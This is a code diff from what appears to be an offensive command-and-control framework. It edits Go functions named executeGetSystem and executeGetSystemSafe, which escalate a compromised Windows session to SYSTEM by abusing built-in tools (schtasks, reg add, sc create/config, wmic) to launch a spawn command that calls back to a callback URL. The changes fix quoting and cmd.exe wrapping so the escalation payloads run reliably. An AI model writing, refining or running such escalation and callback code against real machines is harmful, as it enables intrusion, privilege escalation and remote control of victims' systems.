@@ -2787,18 +2787,20 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 						cmd = fmt.Sprintf(cmdTemplate, filePath)
 					}
 				} else if isSchTasksTr {
-					// For schtasks /tr, we need to wrap in cmd.exe /c and escape quotes
-					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
-					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
-					// Escape quotes for nested command - use \" for Windows cmd.exe
-					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
+					// For schtasks /tr, we need to pass the command directly without cmd.exe /c wrapper
+					// schtasks interprets /c as its own option if we wrap it
+					spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
+					spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)
+					// Escape quotes for nested command
+					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isSchTasksXml {
 					fmt.Printf("[!] Skipping Scheduled Task XML Manipulation - requires XML file\n")
 					commandFailed = true
 					break
 				} else if isRegAddD {
-					// For reg add /d, we need to escape quotes
+					// For reg add /d, we need to escape quotes properly
+					// reg add expects the value to be in quotes, so we escape internal quotes
 					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isRegImagePath {
@@ -2808,9 +2810,11 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isScCreate || isScConfig {
-					// For sc create/config binPath=, we need to escape quotes and wrap in cmd.exe /c
+					// For sc create/config binPath=, we need to escape quotes properly
+					// sc config expects binPath= "path" format, so we escape internal quotes
 					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					// Escape quotes - need to escape \" for Windows
 					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isWmic {
@@ -3296,33 +3300,49 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 						cmd = fmt.Sprintf(cmdTemplate, filePath)
 					}
 				} else if isSchTasksTr {
-					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
-					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
-					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
+					// For schtasks /tr, we need to pass the command directly without cmd.exe /c wrapper
+					// schtasks interprets /c as its own option if we wrap it
+					spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
+					spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)
+					// Escape quotes for nested command
+					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isSchTasksXml {
 					fmt.Printf("[!] Skipping Scheduled Task XML Manipulation - requires XML file\n")
 					commandFailed = true
 					break
 				} else if isRegAddD {
+					// For reg add /d, we need to escape quotes properly
+					// reg add expects the value to be in quotes, so we escape internal quotes
 					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isRegImagePath {
+					// For reg add ImagePath, wrap in cmd.exe /c
 					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
 					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isScCreate || isScConfig {
+					// For sc create/config binPath=, we need to escape quotes properly
+					// sc config expects binPath= "path" format, so we escape internal quotes
 					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					// Escape quotes - need to escape \" for Windows
 					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isWmic {
+					// For wmic, wrap in cmd.exe /c
 					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
 					cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
 				} else {
-					cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
+					// For other commands, check if template has %s placeholder
+					if strings.Contains(cmdTemplate, `%s`) {
+						cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
+					} else {
+						// Template doesn't have %s, use as-is (may have %% for environment variables)
+						cmd = cmdTemplate
+					}
 				}
 				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
 				task := &tasks.Task{
